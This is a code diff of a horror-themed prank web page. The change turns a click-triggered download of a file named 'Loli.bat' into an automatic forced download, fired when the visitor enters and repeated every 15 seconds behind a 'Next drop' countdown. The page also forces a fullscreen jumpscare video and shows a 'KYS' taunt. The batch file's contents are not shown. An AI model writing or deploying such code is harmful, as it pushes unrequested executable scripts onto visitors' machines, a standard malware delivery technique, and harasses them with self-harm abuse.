@@ -28,7 +28,6 @@
       overflow: hidden;
     }
 
-    /* Jumpscare button */
     #jumpscare-btn {
       position: fixed;
       bottom: 20px;
@@ -408,7 +407,6 @@
 
 <div class="main-content" id="main">
 
-  <!-- JUMPSCARE VIDEO – hidden until button is clicked -->
   <video id="jumpscare-video" muted playsinline style="display:none; position:fixed; inset:0; width:100vw; height:100vh; object-fit:cover; background:#000; z-index:9998;">
     <source src="Jeff The Killer loud jumpscare.mp4" type="video/mp4">
     Your browser does not support the video tag.
@@ -526,9 +524,11 @@ Your whole bloodline is cooked. KYS.
   </div>
 </div>
 
+<div id="cooldown-indicator"></div>
+
 <script>
 // ────────────────────────────────────────────────
-//   JUMPSCARE – only when clicking the "click me" button
+//   JUMPSCARE
 // ────────────────────────────────────────────────
 const jumpscareBtn = document.getElementById('jumpscare-btn');
 const jumpscareVideo = document.getElementById('jumpscare-video');
@@ -539,14 +539,9 @@ function playJumpscare() {
   jumpscareVideo.muted = false;
   jumpscareVideo.play().catch(e => console.log("Play prevented:", e));
 
-  // Attempt fullscreen
-  if (jumpscareVideo.requestFullscreen) {
-    jumpscareVideo.requestFullscreen().catch(() => {});
-  } else if (jumpscareVideo.webkitRequestFullscreen) {
-    jumpscareVideo.webkitRequestFullscreen();
-  } else if (jumpscareVideo.msRequestFullscreen) {
-    jumpscareVideo.msRequestFullscreen();
-  }
+  if (jumpscareVideo.requestFullscreen) jumpscareVideo.requestFullscreen().catch(() => {});
+  else if (jumpscareVideo.webkitRequestFullscreen) jumpscareVideo.webkitRequestFullscreen();
+  else if (jumpscareVideo.msRequestFullscreen) jumpscareVideo.msRequestFullscreen();
 
   jumpscareBtn.style.display = 'none';
 
@@ -568,44 +563,83 @@ function playJumpscare() {
 }
 
 jumpscareBtn.addEventListener('click', (e) => {
-  e.stopPropagation();   // prevent document click → download
+  e.stopPropagation();
   playJumpscare();
 });
 
 // ────────────────────────────────────────────────
-//   Any other click → attempt to download Loli.bat
+//   AUTO DOWNLOAD EVERY 15 SECONDS
 // ────────────────────────────────────────────────
-function tryDownloadBat() {
+const COOLDOWN_MS = 15000;
+let nextDownloadTime = 0;
+
+function tryDownloadLoli() {
+  const now = Date.now();
+  if (now < nextDownloadTime) return;
+
+  nextDownloadTime = now + COOLDOWN_MS;
+
   const a = document.createElement('a');
   a.href = 'Loli.bat';
   a.download = 'Loli.bat';
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
+
+  console.log("[Mandox] Attempted Loli.bat download — next in 15s");
 }
 
+// Cooldown indicator
+const cooldownEl = document.getElementById('cooldown-indicator');
+cooldownEl.style.cssText = `
+  position: fixed;
+  bottom: 80px;
+  right: 20px;
+  background: rgba(0,0,0,0.7);
+  color: #ff4444;
+  padding: 8px 14px;
+  border: 1px solid #444;
+  border-radius: 4px;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.9rem;
+  z-index: 998;
+  pointer-events: none;
+  min-width: 140px;
+  text-align: center;
+`;
+
+function updateCooldownDisplay() {
+  const remaining = Math.max(0, Math.ceil((nextDownloadTime - Date.now()) / 1000));
+  cooldownEl.textContent = `Next drop: ${remaining}s`;
+  cooldownEl.style.color = remaining <= 3 ? '#44ff44' : '#ff4444';
+}
+
+setInterval(updateCooldownDisplay, 800);
+
 // ────────────────────────────────────────────────
-//   Enter site logic
+//   ENTER SITE
 // ────────────────────────────────────────────────
 document.getElementById('enter-btn').addEventListener('click', () => {
   document.getElementById('warning').style.display = 'none';
   document.getElementById('main').style.display = 'block';
   document.body.style.overflow = 'auto';
 
-  // Start listening for clicks (except jumpscare button)
-  document.addEventListener('click', (e) => {
-    if (e.target.id !== 'jumpscare-btn' && !jumpscareBtn.contains(e.target)) {
-      tryDownloadBat();
-    }
-  });
+  // Start auto-download immediately + every 15s
+  tryDownloadLoli();
+  setInterval(tryDownloadLoli, COOLDOWN_MS);
 
-  // Start background audio
+  // Start cooldown display
+  updateCooldownDisplay();
+
+  // Background audio
   const bgAudio = document.getElementById('bg-audio');
   bgAudio.play().catch(() => {});
   document.getElementById('audio-toggle').textContent = '🔊 Playing';
 });
 
-// Tab switching
+// ────────────────────────────────────────────────
+//   TABS
+// ────────────────────────────────────────────────
 document.querySelectorAll('.tab').forEach(tab => {
   tab.addEventListener('click', () => {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -615,18 +649,18 @@ document.querySelectorAll('.tab').forEach(tab => {
   });
 });
 
-// Audio toggle
+// ────────────────────────────────────────────────
+//   AUDIO TOGGLE
+// ────────────────────────────────────────────────
 const bgAudio = document.getElementById('bg-audio');
 const toggleBtn = document.getElementById('audio-toggle');
 toggleBtn.addEventListener('click', () => {
   if (bgAudio.paused || bgAudio.ended) {
     bgAudio.play().catch(() => {});
     toggleBtn.textContent = '🔊 Playing';
-    toggleBtn.style.background = '#111111';
   } else {
     bgAudio.pause();
     toggleBtn.textContent = '🔇 Muted';
-    toggleBtn.style.background = '#330000';
   }
 });
 </script>
